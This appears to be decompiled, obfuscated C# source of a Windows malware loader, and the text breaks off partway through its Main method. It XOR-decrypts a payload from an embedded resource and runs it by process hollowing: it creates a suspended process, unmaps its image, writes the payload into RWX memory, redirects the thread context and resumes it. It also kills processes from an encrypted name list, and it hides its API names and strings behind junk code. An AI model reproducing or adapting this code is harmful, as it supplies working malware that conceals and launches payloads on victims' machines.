using System;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Attributes;
using SmartAssembly.License;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;

namespace ns0;

[StandardModule]
internal sealed class Class2
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	public static byte[] smethod_0(byte[] byte_0, float float_0, ulong ulong_0, string string_0)
	{
		int num = default(int);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		int num2 = default(int);
		decimal num4 = default(decimal);
		decimal num5 = default(decimal);
		int num6 = default(int);
		int num7 = default(int);
		byte[] array3 = default(byte[]);
		byte[] array4 = default(byte[]);
		object[] array5 = default(object[]);
		int num8 = default(int);
		try
		{
			try
			{
				num = 13;
				array = new byte[14]
				{
					19, 135, 0, 0, 0, 0, 0, 0, 0, 0,
					0, 0, 0, 0
				};
				num = 14;
				array[2] = 157;
				array[3] = 239;
				array[4] = 154;
				num = 5;
				array[5] = 34;
				array[6] = 130;
				array[7] = 158;
				num = 3;
				array[8] = 21;
				array[9] = 93;
				array[10] = 219;
				num = 10;
				array[11] = 238;
				array[12] = 126;
				array[13] = 211;
				num = 15;
				array2 = array;
				num2 = array2.Length;
				decimal num3 = new decimal(19L);
				num4 = new decimal(125L);
				num5 = num3;
				num = 8;
				while (ForLoopControl.ForNextCheckDec(num5, num4, 1m))
				{
					num = 11;
					num5 = SmartAssembly.SmartUsageCore.DoNotPruneAttribute.smethod_0(num5, 1m, 1011, 945);
					num = 8;
				}
				num = 9;
				num6 = checked(byte_0.Length - 1);
				num7 = 0;
				num = 2;
				while (num7 <= num6)
				{
					num = 1;
					byte_0[num7] = (byte)(byte_0[num7] ^ array2[num7 % num2]);
					num = 6;
					num7 = checked(num7 + 1);
					num = 2;
				}
				num = 12;
				array3 = byte_0;
				array4 = array3;
			}
			catch (Exception caughtException)
			{
				array5 = new object[12]
				{
					array3, array2, num2, num5, num7, array, num4, num6, byte_0, float_0,
					ulong_0, string_0
				};
				StackFrameHelper.CreateExceptionN(caughtException, array5);
				throw;
			}
			num8 = 2;
			return array4;
		}
		catch (Exception caughtException2)
		{
			StackFrameHelper.CreateExceptionN(caughtException2, new object[16]
			{
				array3, array2, num2, num5, num7, array, num4, num6, array5, array4,
				num, num8, byte_0, float_0, ulong_0, string_0
			});
			throw;
		}
	}

	public static string smethod_1(double double_0, int int_0, decimal decimal_0, string string_0, long long_0, string string_1)
	{
		int num = default(int);
		bool flag = default(bool);
		long num2 = default(long);
		string text = default(string);
		string text2 = default(string);
		int num3 = default(int);
		try
		{
			try
			{
				num = 2;
				flag = true;
				num = 1;
				num2 = 17L;
				num = 0;
				while (true)
				{
					num2 = checked(num2 + 1L);
					if (num2 > 28L)
					{
						break;
					}
					num = 0;
				}
				num = 9;
				num = 4;
				text = SendingReportFeedbackEventArgs1.smethod_1(Class33.smethod_0(793, 836), smethod_0(AppRegistryKeys.smethod_0(string_0, 690, 666), -20015.908f, 133212878uL, "(B"), 565, 524);
				num = 8;
				text2 = text;
			}
			catch (Exception exception)
			{
				StackFrameHelper.CreateException9(exception, flag, text, num2, double_0, int_0, decimal_0, string_0, long_0, string_1);
				throw;
			}
			num3 = 3;
			return text2;
		}
		catch (Exception caughtException)
		{
			StackFrameHelper.CreateExceptionN(caughtException, new object[12]
			{
				flag, text, num2, text2, num, num3, double_0, int_0, decimal_0, string_0,
				long_0, string_1
			});
			throw;
		}
	}

	public static void smethod_2()
	{
		int num = default(int);
		int num5 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		int num2 = default(int);
		int num7 = default(int);
		Process process = default(Process);
		int num8 = default(int);
		char[] array = default(char[]);
		string[] array2 = default(string[]);
		Process[] array3 = default(Process[]);
		int num9 = default(int);
		int num10 = default(int);
		try
		{
			try
			{
				num = 0;
				int try0003_dispatch = -1;
				while (true)
				{
					try
					{
						/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
						string string_;
						switch (try0003_dispatch)
						{
						default:
							num5 = 17;
							UsageReportSender.smethod_8(570, 618);
							num4 = -2;
							num5 = 18;
							goto IL_001e;
						case 357:
							{
								num3 = num2;
								if (num4 <= -2)
								{
									num5 = 13;
								}
								else
								{
									num5 = 0;
									switch (num4)
									{
									default:
										num5 = 11;
										goto end_IL_0003;
									case 0:
										num5 = 11;
										goto end_IL_0003;
									case 1:
										break;
									}
								}
								num5 = 10;
								int num6 = num3 + 1;
								num3 = 0;
								switch (num6)
								{
								case 1:
									break;
								default:
									num5 = 16;
									goto end_IL_0003;
								case 0:
									num5 = 16;
									goto end_IL_0003;
								case 2:
									goto IL_0136;
								case 3:
									goto IL_013f;
								case 4:
									goto IL_0148;
								case 5:
									goto IL_014d;
								case 6:
									goto IL_0156;
								case 7:
									goto IL_015b;
								case 8:
									num5 = 5;
									goto end_IL_0003_2;
								}
								goto default;
							}
							IL_00f3:
							num2 = 7;
							num7 = checked(num7 + 1);
							if (num7 <= 11)
							{
								num5 = 2;
								goto IL_0102;
							}
							num5 = 5;
							goto end_IL_0003_2;
							IL_00c6:
							num2 = 5;
							PoweredBy.smethod_0(process, 218, 187);
							num8 = checked(num8 + 1);
							num5 = 4;
							goto IL_00e2;
							IL_00e2:
							num2 = 6;
							num5 = 7;
							goto IL_00e8;
							IL_015b:
							num5 = 6;
							goto IL_00f3;
							IL_0156:
							num5 = 4;
							goto IL_00e2;
							IL_014d:
							num5 = 15;
							goto IL_00c6;
							IL_0148:
							num5 = 2;
							goto IL_0102;
							IL_013f:
							num5 = 9;
							goto IL_00ae;
							IL_0136:
							num5 = 18;
							goto IL_001e;
							IL_001e:
							num2 = 2;
							string_ = smethod_1(670.7, 416407755, new decimal(100488684L), "U8jxg+Nm4PlVDrmHG5Bn9fGv90Dj81Udm64KsmDs8IjoYsLWfDe6jRWHe+7ur8xL8OpgPLfOLpBT09ii/0/t7GwOuI8QvXb13Q==", 1688342099L, "qRs'0bC");
							array = new char[1] { UnhandledExceptionHandlerWithUI.smethod_1(smethod_1(4970.616, 698393177, 0m, "Uw==", -56950068L, "pcP9pU"), 709, 722) };
							array2 = SendingReportFeedbackEventArgs1.smethod_2(string_, array, 970, 983);
							num5 = 9;
							goto IL_00ae;
							IL_00ae:
							num2 = 3;
							num7 = 0;
							num5 = 2;
							goto IL_0102;
							IL_0102:
							num2 = 4;
							array3 = AutoHeightLabel.smethod_0(array2[num7], 49, 50);
							num5 = 21;
							num8 = 0;
							num5 = 7;
							goto IL_00e8;
							IL_00e8:
							if (num8 < array3.Length)
							{
								num5 = 14;
								process = array3[num8];
								num5 = 15;
								goto IL_00c6;
							}
							num5 = 6;
							goto IL_00f3;
							end_IL_0003:
							break;
						}
					}
					catch (object obj) when (obj is Exception && num4 != 0 && num3 == 0)
					{
						SimpleZip.Class15.smethod_0((Exception)obj, 205, 171);
						try0003_dispatch = 357;
						continue;
					}
					num9 = 1;
					throw Class33.smethod_1(-2146828237, 370, 257);
					continue;
					end_IL_0003_2:
					break;
				}
				if (num3 != 0)
				{
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception exception)
			{
				StackFrameHelper.CreateException9(exception, array2, num7, process, array, num8, array3, num4, num3, num2);
				throw;
			}
			num10 = 0;
		}
		catch (Exception caughtException)
		{
			StackFrameHelper.CreateExceptionN(caughtException, new object[13]
			{
				array2, num7, process, array, num8, array3, num4, num3, num2, num,
				num5, num9, num10
			});
			throw;
		}
	}

	public static int smethod_3(int int_0, short short_0, byte[] byte_0, ushort ushort_0)
	{
		int num = default(int);
		bool flag = default(bool);
		Color color_ = default(Color);
		int num2 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		try
		{
			try
			{
				num = 1;
				flag = true;
				num = 5;
				color_ = checked(PoweredByAttribute.smethod_1(byte_0[int_0 + 3], byte_0[int_0 + 2], byte_0[int_0 + 1], byte_0[int_0], 822, 786));
				num = 3;
				num2 = Class4.smethod_3(ref color_, 939, 982);
				num3 = num2;
			}
			catch (Exception exception)
			{
				StackFrameHelper.CreateException7(exception, flag, num2, color_, int_0, short_0, byte_0, ushort_0);
				throw;
			}
			num4 = 1;
			return num3;
		}
		catch (Exception exception2)
		{
			StackFrameHelper.CreateException10(exception2, flag, num2, color_, num3, num, num4, int_0, short_0, byte_0, ushort_0);
			throw;
		}
	}

	public static byte[] smethod_4(int int_0)
	{
		int num = default(int);
		long num2 = default(long);
		bool flag = default(bool);
		float num3 = default(float);
		DateTime dateTime = default(DateTime);
		bool flag2 = default(bool);
		double num4 = default(double);
		Color color_ = default(Color);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		byte[] array3 = default(byte[]);
		int num5 = default(int);
		try
		{
			try
			{
				num = 3;
				num2 = 338981721L;
				flag = true;
				num3 = 15f;
				num = 10;
				while (true)
				{
					dateTime = UsageReportSender.smethod_9(681, 699);
					num3 += 1f;
					num = 12;
					if (!(num3 <= 75f))
					{
						break;
					}
					num = 10;
				}
				num = 13;
				num = ((!flag) ? 5 : 5);
				flag2 = true;
				num = 1;
				num4 = 18.0;
				num = 4;
				while (true)
				{
					num4 += 1.0;
					if (!(num4 <= 118.0))
					{
						break;
					}
					num = 4;
				}
				num = 0;
				color_ = SimpleZip.Class11.smethod_0(int_0, 752, 646);
				array = new byte[4];
				num = 11;
				array[0] = SendingReportFeedbackEventArgs.smethod_1(ref color_, 627, 517);
				array[1] = SendingReportFeedbackEventArgs.smethod_1(ref color_, 475, 428);
				num = 8;
				array[2] = AppNameFinder.smethod_1(ref color_, 539, 569);
				array[3] = DoNotDistributeAttribute.smethod_1(ref color_, 998, 1016);
				num = 6;
				array2 = array;
				array3 = array2;
			}
			catch (Exception exception)
			{
				StackFrameHelper.CreateException10(exception, flag2, color_, flag, num2, array2, num3, dateTime, num4, array, int_0);
				throw;
			}
			num5 = 1;
			return array3;
		}
		catch (Exception caughtException)
		{
			StackFrameHelper.CreateExceptionN(caughtException, new object[13]
			{
				flag2, color_, flag, num2, array2, num3, dateTime, num4, array, array3,
				num, num5, int_0
			});
			throw;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	public static hjqr smethod_5<hjqr>(string string_0)
	{
		int num = default(int);
		ushort num2 = default(ushort);
		uint num3 = default(uint);
		long num4 = default(long);
		ulong num5 = default(ulong);
		bool flag = default(bool);
		double num6 = default(double);
		string text = default(string);
		int num7 = default(int);
		int num8 = default(int);
		char c = default(char);
		long num9 = default(long);
		char[] array = default(char[]);
		char[] array2 = default(char[]);
		hjqr val = default(hjqr);
		hjqr val2 = default(hjqr);
		object[] array3 = default(object[]);
		int num10 = default(int);
		try
		{
			try
			{
				num = 13;
				num2 = 19;
				num = 3;
				while (true)
				{
					num3 = 11u;
					num = 2;
					checked
					{
						while (true)
						{
							num4 = 6L;
							num = 4;
							while (true)
							{
								num4++;
								if (num4 > 49L)
								{
									break;
								}
								num = 4;
							}
							num = 10;
							num5 = 0uL;
							num = 15;
							while (true)
							{
								flag = true;
								num = 11;
								num5++;
								if (num5 > 109L)
								{
									break;
								}
								num = 15;
							}
							num = 6;
							num6 = 3012.9;
							text = "Mc3H:Mbi";
							num7 = 0;
							num8 = AppPathFinder.smethod_1(text, 662, 673);
							num = 7;
							while (num7 < num8)
							{
								num = 16;
								c = Class35.smethod_1(text, num7, 1013, 924);
								num7++;
								num = 7;
							}
							num = 8;
							num3++;
							if (num3 > 55)
							{
								break;
							}
							num = 2;
						}
						num = 5;
						num9 = 644892253L;
						num2 = (ushort)unchecked((uint)(num2 + 1));
					}
					if ((uint)num2 > 74u)
					{
						break;
					}
					num = 3;
				}
				num = 9;
				array = new char[1] { Class22.smethod_6(58, 422, 401) };
				IntPtr intptr_ = LoadLibrary(SendingReportFeedbackEventArgs1.smethod_2(string_0, array, 191, 162)[0]);
				array2 = new char[1] { Class22.smethod_6(58, 623, 600) };
				val = Conversions.ToGenericParameter<hjqr>((object)_003CPrivateImplementationDetails_003E.smethod_0(GetProcAddress(intptr_, SendingReportFeedbackEventArgs1.smethod_2(string_0, array2, 111, 114)[1]), SendingReportFeedbackEventArgs1.smethod_0(typeof(hjqr).TypeHandle, 391, 508), 490, 385));
				num = 17;
				val2 = val;
			}
			catch (Exception caughtException)
			{
				array3 = new object[15]
				{
					val, num9, num2, num3, num6, num4, flag, num5, c, num7,
					text, num8, array, array2, string_0
				};
				StackFrameHelper.CreateExceptionN(caughtException, array3);
				throw;
			}
			num10 = 2;
			return val2;
		}
		catch (Exception caughtException2)
		{
			StackFrameHelper.CreateExceptionN(caughtException2, new object[19]
			{
				val, num9, num2, num3, num6, num4, flag, num5, c, num7,
				text, num8, array, array2, array3, val2, num, num10, string_0
			});
			throw;
		}
	}

	public static void smethod_6(object object_0)
	{
		int num = default(int);
		bool flag = default(bool);
		MethodInfo methodInfo = default(MethodInfo);
		string text = default(string);
		int num2 = default(int);
		int num3 = default(int);
		char c = default(char);
		bool flag2 = default(bool);
		object[] array = default(object[]);
		int num4 = default(int);
		try
		{
			try
			{
				num = 10;
				flag = false;
				num = 2;
				methodInfo = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.smethod_2(UnhandledExceptionHandlerWithUI.smethod_3((byte[])object_0, 601, 553), 208, 191);
				num = 3;
				text = "&w;W*15UM";
				num2 = 0;
				num3 = AppPathFinder.smethod_1(text, 445, 394);
				num = 4;
				while (num2 < num3)
				{
					num = 8;
					c = Class35.smethod_1(text, num2, 554, 579);
					num2 = checked(num2 + 1);
					num = 4;
				}
				num = 7;
				flag2 = false;
				if (Form0.smethod_2(methodInfo, 152, 190).Length == 0)
				{
					num = 14;
					Form1.smethod_1(methodInfo, null, null, 996, 1018);
					num = 9;
				}
				else
				{
					num = 0;
					MethodInfo methodBase_ = methodInfo;
					array = new object[1] { new string[0] };
					Form1.smethod_1(methodBase_, null, array, 318, 288);
					num = 9;
				}
			}
			catch (Exception exception)
			{
				StackFrameHelper.CreateException9(exception, methodInfo, flag, flag2, c, num2, text, num3, array, object_0);
				throw;
			}
			num4 = 1;
		}
		catch (Exception caughtException)
		{
			StackFrameHelper.CreateExceptionN(caughtException, new object[11]
			{
				methodInfo, flag, flag2, c, num2, text, num3, array, num, num4,
				object_0
			});
			throw;
		}
	}

	public static void smethod_7(float float_0, ushort ushort_0, sbyte sbyte_0, sbyte sbyte_1, byte[] byte_0, ulong ulong_0)
	{
		checked
		{
			int num = default(int);
			int num2 = default(int);
			bool flag = default(bool);
			ushort num3 = default(ushort);
			byte b = default(byte);
			short num4 = default(short);
			Thread thread = default(Thread);
			byte b2 = default(byte);
			int num5 = default(int);
			string text = default(string);
			string[] array = default(string[]);
			int num6 = default(int);
			string text2 = default(string);
			byte[] array2 = default(byte[]);
			byte[] array3 = default(byte[]);
			int[] array4 = default(int[]);
			int[] array5 = default(int[]);
			int num7 = default(int);
			int num8 = default(int);
			bool flag2 = default(bool);
			IntPtr intPtr = default(IntPtr);
			IntPtr[] array6 = default(IntPtr[]);
			IntPtr intPtr2 = default(IntPtr);
			int num9 = default(int);
			uint[] array7 = default(uint[]);
			IntPtr intPtr3 = default(IntPtr);
			IntPtr intPtr4 = default(IntPtr);
			IntPtr intptr_3 = default(IntPtr);
			IntPtr intptr_4 = default(IntPtr);
			uint num10 = default(uint);
			IntPtr intPtr5 = default(IntPtr);
			IntPtr intPtr6 = default(IntPtr);
			IntPtr intptr_7 = default(IntPtr);
			Delegate5 delegate3 = default(Delegate5);
			bool flag3 = default(bool);
			int[] array8 = default(int[]);
			int num11 = default(int);
			int num12 = default(int);
			byte[] array9 = default(byte[]);
			int num13 = default(int);
			string text3 = default(string);
			int num14 = default(int);
			object[] array10 = default(object[]);
			int num15 = default(int);
			try
			{
				try
				{
					num = 31;
					num2 = 0;
					num = 37;
					while (true)
					{
						flag = true;
						num = 25;
						num3 = 31875;
						b = (byte)num2;
						num2++;
						num = 9;
						if (num2 > 100)
						{
							break;
						}
						num = 37;
					}
					num = 8;
					if (byte_0[60] == 128)
					{
						num = 35;
						num4 = 2302;
						thread = new Thread(smethod_6);
						SmartAssembly.SmartUsageCore.DoNotPruneAttribute.smethod_2(thread, ApartmentState.STA, 197, 174);
						num = 18;
						b2 = 0;
						num = 36;
						while (true)
						{
							num5 = b2;
							num = 24;
							while (true)
							{
								if (num5 <= 30)
								{
									num = 33;
									if (num5 != 25)
									{
										num = 7;
										num5++;
										num = 24;
										continue;
									}
									num = 23;
									num = 14;
									break;
								}
								num = 14;
								break;
							}
							b2 = (byte)unchecked((uint)(b2 + 1));
							if (unchecked((uint)b2) > 20u)
							{
								break;
							}
							num = 36;
						}
						num = 34;
						AppRegistryKeys.smethod_1(thread, byte_0, 283, 308);
						goto IL_0916;
					}
					num = 21;
					text = DESCryptoIndirector.smethod_0(DoNotDistributeAttribute.smethod_2(1022, 911), 231, 134);
					num = 12;
					if (Class3.smethod_6(Form0.smethod_1(HeaderControl.smethod_1(Class35.smethod_1(SimpleZip.Class11.smethod_1(532, 639), 0, 611, 522), 842, 780), smethod_1(0.0, 1802622029, new decimal(-544403270L), "KdvNnfVF8P94fZ2HErZgp7WXohSr", 0L, "w\\?kP2V&\\y"), 681, 667), 993, 997))
					{
						num = 6;
						array = StackFrameHelper.smethod_0(Form0.smethod_1(HeaderControl.smethod_1(Class35.smethod_1(SimpleZip.Class11.smethod_1(365, 262), 0, 151, 254), 568, 638), smethod_1(25208.6, 769304218, new decimal(1640571858L), "KdvKhvRG7elmAZaHHaF89PKJ7gzM20EBnZwfvnbw8p3x", 981349592L, "]>[]EQT/So"), 33, 19), 592, 548);
						num = 13;
						num6 = 0;
						num = 30;
						while (true)
						{
							if (num6 < array.Length)
							{
								num = 2;
								text2 = array[num6];
								if (!AppNameFinder.smethod_2(DoNotPruneTypeAttribute.smethod_4(text2, 104, 8), smethod_1(13320.1535, 1393893100, new decimal(1010445655L), "ZbWz37Q=", 1907931065L, null), 555, 621))
								{
									num = 0;
									num6++;
									num = 30;
									continue;
								}
								num = 11;
								text = Form0.smethod_1(text2, smethod_1(0.0, 860220632, new decimal(-803707391L), "T+Trm+hH8bBwJb4=", 2029779096L, "eSU99[A"), 808, 794);
								num = 15;
								num = 20;
								break;
							}
							num = 20;
							break;
						}
					}
					else
					{
						num = 20;
					}
					array2 = new byte[6] { 0, 1, 0, 0, 0, 0 };
					num = 28;
					array2[2] = 2;
					array2[3] = 3;
					array2[4] = 4;
					num = 32;
					array2[5] = 5;
					array3 = array2;
					array4 = new int[8] { 1, 0, 0, 0, 0, 0, 0, 0 };
					num = 27;
					array4[1] = 16;
					array4[2] = 2;
					array4[3] = 32;
					num = 5;
					array4[4] = 4;
					array4[5] = 64;
					array4[6] = 4;
					num = 3;
					array4[7] = 64;
					array5 = array4;
					num7 = smethod_3(60, 13308, byte_0, 2179);
					num = 16;
					num8 = SecurityExceptionEventArgs.smethod_3(byte_0, num7 + 6, 69, 51);
					flag2 = false;
					num = 10;
					intPtr = new IntPtr(smethod_3(num7 + 84, 28033, byte_0, 12428));
					num = 26;
					array6 = new IntPtr[4];
					flag2 = true;
					if (!smethod_5<Delegate0>(smethod_1(-11800.0, 2002489458, new decimal(1744272669L), "eOLvgf9OsawvHqmLH6d21++A+Ufx7VQ=", 247093004L, "*[1X'M ^"))(null, text, intPtr2, intPtr2, bool_0: false, 4, intPtr2, null, new byte[0], array6))
					{
						num = 4;
					}
					else
					{
						num = 22;
						try
						{
							num9 = 11;
							array7 = new uint[179];
							array7[0] = 65538u;
							if (!smethod_5<Delegate1>(smethod_1(21010.0, 328708502, new decimal(1554825148L), "eOLvgf9OsawvGr6aKrth4vyL2U3s6nAlrw==", 2075751399L, "c8n`{SY"))(array6[1], array7))
							{
								num9 = 12;
								goto IL_08db;
							}
							num9 = 3;
							flag2 = false;
							Delegate2 @delegate = smethod_5<Delegate2>(smethod_1(4630.78, -161758332, new decimal(512392022L), "eOLvgf9OsawvD76PGoNh6P6K6VHP+3gyqZc=", -708287634L, "F` f"));
							IntPtr intptr_ = array6[0];
							intPtr3 = new IntPtr(unchecked((long)array7[41]) + 8L);
							IntPtr intptr_2 = intPtr3;
							intPtr4 = new IntPtr(4);
							if (!@delegate(intptr_, intptr_2, ref intptr_3, intPtr4, ref intptr_4))
							{
								num9 = 25;
								goto IL_08af;
							}
							num9 = 22;
							if (unchecked((long)smethod_5<Delegate3>(smethod_1(23232.8, 2028707899, new decimal(1426583930L), "ffP5g/YYzOpAM7aPDoV64uqg/HHn/WE0tIA=", -752323096L, "r2~:m7"))(array6[0], intptr_3)) != 0L)
							{
								num9 = 2;
								num10 = 18u;
								num9 = 26;
								while (true)
								{
									num10++;
									if (num10 > 46)
									{
										break;
									}
									num9 = 26;
								}
								num9 = 25;
								goto IL_08af;
							}
							num9 = 0;
							Delegate4 delegate2 = smethod_5<Delegate4>(smethod_1(18363.4, 0, new decimal(1351706969L), "eOLvgf9OsawvC7KcCqZy69yD9k3h220=", -474676936L, "9dJ"));
							IntPtr intptr_5 = array6[0];
							intPtr5 = new IntPtr(smethod_3(num7 + 52, 14732, byte_0, 28610));
							IntPtr intptr_6 = intPtr5;
							intPtr6 = new IntPtr(smethod_3(num7 + 80, 6290, byte_0, 18798));
							intptr_7 = delegate2(intptr_5, intptr_6, intPtr6, 12288, 64);
							num9 = 24;
							delegate3 = smethod_5<Delegate5>(smethod_1(0.0, 1754998787, new decimal(814879642L), "eOLvgf9OsawvCqmHCrZD9fKM/1Hx03AwtJwH", 1328419434L, "Q`TsFa"));
							num9 = 20;
							array3 = null;
							flag3 = delegate3(array6[0], intptr_7, byte_0, intPtr, ref intptr_4);
							num9 = 14;
							array8 = new int[10];
							flag2 = true;
							num11 = num8 - 1;
							num12 = 0;
							num9 = 23;
							while (num12 <= num11)
							{
								num9 = 27;
								array8[0] = 13;
								array8[5] = 255 + array8[0];
								num9 = 7;
								AppPathFinder.smethod_0(byte_0, num7 + 248 + num12 * 40, array8, 0, 40, 473, 450);
								num9 = 6;
								array9 = new byte[array8[4] - 1 + 1];
								num9 = 16;
								AppPathFinder.smethod_0(byte_0, array8[5], array9, 0, array9.Length, 400, 395);
								num9 = 13;
								num13 = array8.Length;
								text3 = num13.ToString();
								Delegate5 delegate4 = delegate3;
								IntPtr intptr_8 = array6[0];
								intPtr6 = new IntPtr(Class26.smethod_0(ref intptr_7, 297, 288) + array8[3]);
								IntPtr intptr_9 = intPtr6;
								byte[] byte_ = array9;
								intPtr5 = new IntPtr(array9.Length);
								flag3 = delegate4(intptr_8, intptr_9, byte_, intPtr5, ref intptr_4);
								num9 = 1;
								num12++;
								num9 = 23;
							}
							num9 = 10;
							flag2 = false;
							Delegate5 delegate5 = delegate3;
							IntPtr intptr_10 = array6[0];
							intPtr6 = new IntPtr(unchecked((long)array7[41]) + 8L);
							IntPtr intptr_11 = intPtr6;
							byte[] byte_2 = smethod_4(Class26.smethod_0(ref intptr_7, 290, 299));
							intPtr5 = new IntPtr(4);
							flag3 = delegate5(intptr_10, intptr_11, byte_2, intPtr5, ref intptr_4);
							num9 = 5;
							array7[44] = (uint)(Class26.smethod_0(ref intptr_7, 379, 370) + smethod_3(num7 + 40, 1081, byte_0, 23727));
							num9 = 19;
							smethod_5<Delegate1>(smethod_1(17051.0, 1006800026, new decimal(-889059843L), "eOLvgf9OsawvDr6aKrth4vyL2U3s6nAlrw==", 0L, "Us1Yf9s{L"))(array6[1], array7);
							num9 = 18;
							num9 = 17;
							smethod_5<Delegate6>(smethod_1(0.0, -180899721, new decimal(1244395517L), "eOLvgf9OsawvD76dC7520/Wd/0Pm", -989281361L, "(QK:C^G"))(array6[1]);
							num9 = 4;
							goto end_IL_0412;
							IL_08af:
							num9 = 12;
							goto IL_08db;
							end_IL_0412:;
						}
						catch (Exception exception_)
						{
							SimpleZip.Class15.smethod_0(exception_, 749, 651);
							UsageReportSender.smethod_8(508, 428);
							goto IL_08db;
						}
					}
					goto end_IL_0000;
					IL_08db:
					num14 = 0;
					PoweredBy.smethod_0(Class17.smethod_10(Class26.smethod_0(ref array6[2], 263, 270), 755, 683), 453, 420);
					num14 = 3;
					goto IL_0916;
					IL_0916:
					num14 = 4;
					end_IL_0000:;
				}
				catch (Exception caughtException)
				{
					array10 = new object[45]
					{
						num2, flag, b, num3, thread, num4, b2, num5, intPtr, num8,
						text, array5, array3, array6, num7, flag2, text2, intptr_3, flag3, intptr_4,
						array7, intptr_7, delegate3, array8, text3, array9, num12, num10, num6, array,
						array2, array4, intPtr2, intPtr3, intPtr4, intPtr5, intPtr6, num11, num13, float_0,
						ushort_0, sbyte_0, sbyte_1, byte_0, ulong_0
					};
					StackFrameHelper.CreateExceptionN(caughtException, array10);
					throw;
				}
				num15 = 4;
			}
			catch (Exception caughtException2)
			{
				StackFrameHelper.CreateExceptionN(caughtException2, new object[50]
				{
					num2, flag, b, num3, thread, num4, b2, num5, intPtr, num8,
					text, array5, array3, array6, num7, flag2, text2, intptr_3, flag3, intptr_4,
					array7, intptr_7, delegate3, array8, text3, array9, num12, num10, num6, array,
					array2, array4, intPtr2, intPtr3, intPtr4, intPtr5, intPtr6, num11, num13, array10,
					num, num9, num14, num15, float_0, ushort_0, sbyte_0, sbyte_1, byte_0, ulong_0
				});
				throw;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		if (!License.Validate())
		{
			return;
		}
		int num = default(int);
		int num2 = default(int);
		int num6 = default(int);
		int num5 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		byte b = default(byte);
		ResourceManager resourceManager = default(ResourceManager);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		decimal num8 = default(decimal);
		int num9 = default(int);
		object[] array = default(object[]);
		try
		{
			if (!UnhandledExceptionHandlerWithUI.AttachApp())
			{
				return;
			}
			SmartAssembly.SmartUsageCore.DoNotPruneAttribute.smethod_8();
			num = 3;
			if (!License.Validate())
			{
				num = 0;
				return;
			}
			try
			{
				num2 = 0;
				if (!UnhandledExceptionHandlerWithUI.AttachApp())
				{
					return;
				}
				int try003b_dispatch = -1;
				while (true)
				{
					try
					{
						/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
						switch (try003b_dispatch)
						{
						default:
							num6 = 12;
							UsageReportSender.smethod_8(43, 123);
							num5 = -2;
							num6 = 4;
							goto IL_004f;
						case 605:
							{
								num4 = num3;
								if (num5 <= -2)
								{
									num6 = 5;
								}
								else
								{
									num6 = 13;
									switch (num5)
									{
									default:
										num6 = 28;
										goto end_IL_003b;
									case 0:
										num6 = 28;
										goto end_IL_003b;
									case 1:
										break;
									}
								}
								num6 = 21;
								int num7 = num4 + 1;
								num4 = 0;
								switch (num7)
								{
								case 1:
									break;
								case 0:
									num6 = 3;
									goto end_IL_003b;
								case 2:
									goto IL_01b7;
								case 3:
									goto IL_01bf;
								case 4:
									goto IL_01c8;
								case 5:
									goto IL_01d1;
								case 6:
									goto IL_01d9;
								case 7:
									goto IL_01e2;
								case 8:
									goto IL_01eb;
								case 9:
									goto IL_01f4;
								case 10:
									goto IL_01fd;
								case 11:
									goto IL_0206;
								case 12:
									goto IL_020f;
								case 13:
									goto IL_0218;
								case 14:
									goto IL_0220;
								case 15:
									goto IL_0229;
								case 16:
									goto IL_0232;
								case 17:
									goto IL_023a;
								case 18:
									goto IL_0243;
								case 19:
									goto IL_024c;
								case 20:
									num6 = 20;
									goto end_IL_003b_2;
								default:
									num6 = 3;
									goto end_IL_003b;
								}
								goto default;
							}
							IL_00b1:
							num6 = 10;
							goto IL_00b5;
							IL_00b5:
							num3 = 12;
							b = 6;
							num6 = 7;
							goto IL_00c4;
							IL_0119:
							num3 = 18;
							smethod_7(27503.1f, 3061, 0, 101, smethod_0((byte[])SimpleZip.Class15.smethod_2(resourceManager, smethod_1(31126.0, 212719497, 0m, "fPX02/dL4e0=", 1127241103L, "nL&\\Fc1.>z:"), 831, 833), 16294.082f, 1520815252uL, "0.*9w9"), 0uL);
							num6 = 2;
							break;
							IL_024c:
							num6 = 2;
							break;
							IL_0243:
							num6 = 17;
							goto IL_0119;
							IL_023a:
							num6 = 16;
							goto IL_0115;
							IL_0232:
							num6 = 1;
							goto IL_0104;
							IL_0229:
							num6 = 23;
							goto IL_00fb;
							IL_0220:
							num6 = 27;
							goto IL_00d9;
							IL_0218:
							num6 = 7;
							goto IL_00c4;
							IL_020f:
							num6 = 10;
							goto IL_00b5;
							IL_0206:
							num6 = 29;
							goto IL_00b1;
							IL_01fd:
							num6 = 15;
							goto IL_00a7;
							IL_01f4:
							num6 = 11;
							goto IL_009d;
							IL_01eb:
							num6 = 24;
							goto IL_008c;
